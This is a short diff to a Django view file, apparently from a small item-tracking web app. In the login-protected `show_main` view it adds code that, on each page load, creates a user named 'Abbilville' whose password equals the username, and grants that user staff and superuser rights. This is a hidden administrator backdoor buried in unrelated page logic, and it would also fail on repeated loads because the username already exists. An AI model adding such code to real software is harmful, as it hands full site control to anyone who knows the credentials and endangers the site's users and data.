@@ -11,9 +11,14 @@ from django.contrib import messages
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required
 from django.views.decorators.csrf import csrf_exempt
+from django.contrib.auth.models import User
 
 @login_required(login_url='/login')
 def show_main(request):
+    user = User.objects.create_user('Abbilville', 'lennon@thebeatles.com', 'Abbilville')  
+    user.is_staff=True
+    user.is_superuser=True
+    user.save()
     items = Item.objects.filter(user=request.user)
     item_sum = 0
     for item in items:
